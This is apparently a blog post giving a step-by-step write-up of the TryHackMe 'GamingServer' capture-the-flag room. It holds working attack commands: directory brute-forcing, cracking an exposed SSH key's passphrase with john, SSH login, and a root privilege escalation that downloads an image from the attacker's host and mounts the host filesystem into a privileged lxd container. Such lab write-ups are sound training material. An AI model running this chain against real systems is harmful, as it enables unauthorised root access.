---
title: "GamingServer tryhackme room writeup"
date: 2020-07-23 21:03:36 +0530
author: R4yan
layout: post
permalink: /2020-07-23-gamingserver/
categories: Genel
tags: [CTF, Writeups]
---

writeup of the room GamingServer in TryHackMe

first start by doing a port scan

{% highlight bash %}
rustscan $IP
{% endhighlight %}
results:


{% highlight bash %}
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
{% endhighlight %}

then start start dirbuster or gobuster to search for hidden files

{% highlight bash %}
gobuster dir -u $IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
{% endhighlight %}
you will then find an interesting folder called "/secret" 

![](https://i.imgur.com/dvouO8n.png)

that contains a ssh key, download it

after you downloaded that key create a new hash file using ssh2john
{% highlight bash %}
python ssh2john.py SecretKey > id_rsa.hash
{% endhighlight %}

and then crack it using john and rockyou wordlist
{% highlight bash %}
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
{% endhighlight %}

results
{% highlight bash %}
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (id_rsa)
1g 0:00:00:12 DONE (2020-08-30 22:24) 0.08278g/s 1187Kp/s 1187Kc/s 1187KC/s *7¡Vamos! *
Session completed
{% endhighlight %}
then i found a user that can be used for a ssh connection on the website source code

in the bottom line of : https://$IP/index.html

![](https://i.imgur.com/AkvBtg2.png)

as you can see there is a user called john

connect to the server throught ssh
{% highlight bash %}
ssh john@$IP -i ./SecretKey
{% endhighlight %}
enter the passphrase and you logged in as john

![](https://i.imgur.com/fvRhWhv.png)

now get the user flag

{% highlight bash %}
cat user.txt
a****************e
{% endhighlight %}

after searching and looking in the machine i found an interesting service called lxd(Linux Containers) owned by root and that can be used by anyone,

locally clone that repo and run the other commands

{% highlight bash %}
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
{% endhighlight %}

then start a simple web server

{% highlight bash %}
python -m SimpleHTTPServer
{% endhighlight %}

then download the files you just downloaded locally

{% highlight bash %}
cd /tmp
wget http://$LHOST:8000/alpine-v3.12-x86_64-20200830_2354.tar.gz
{% endhighlight %}

replace $LHOST with your local ip address (run "ip addr" to see it)

import the image by running: 

{% highlight bash %}
lxc image import ./alpine-v3.12-x86_64-20200830_2354.tar.gz --alias myimage
{% endhighlight %}

then spawn a root shell by running this list of commands

{% highlight bash %}
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
whoami
{% endhighlight %}

now get the root flag 

{% highlight bash %}
cat mnt/root/root/flag.txt
2************c

{% endhighlight %}

if you don't get your root shell or it's not working try following this [guide](https://www.hackingarticles.in/lxd-privilege-escalation/) for privilege escalation about lxd
